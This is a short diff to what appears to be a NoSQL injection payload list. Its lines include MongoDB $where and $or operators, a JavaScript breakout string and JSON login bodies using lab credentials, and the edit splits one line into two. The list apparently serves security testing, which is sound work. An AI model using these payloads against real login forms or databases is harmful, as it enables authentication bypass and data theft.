@@ -9,7 +9,8 @@ $where: '1 == 1'
 , $where: '1 == 1'
 ', $where: '1 == 1'
 1, $where: '1 == 1'
-{"username":"wiener","password":"peter", "$where":"0"}{"username":"wiener","password":"peter", "$where":"1"}
+{"username":"wiener","password":"peter", "$where":"0"}
+{"username":"wiener","password":"peter", "$where":"1"}
 true, $where: '1 == 1'
 ', $or: [ {}, { 'a':'a
 ";return(true);var xyz='a
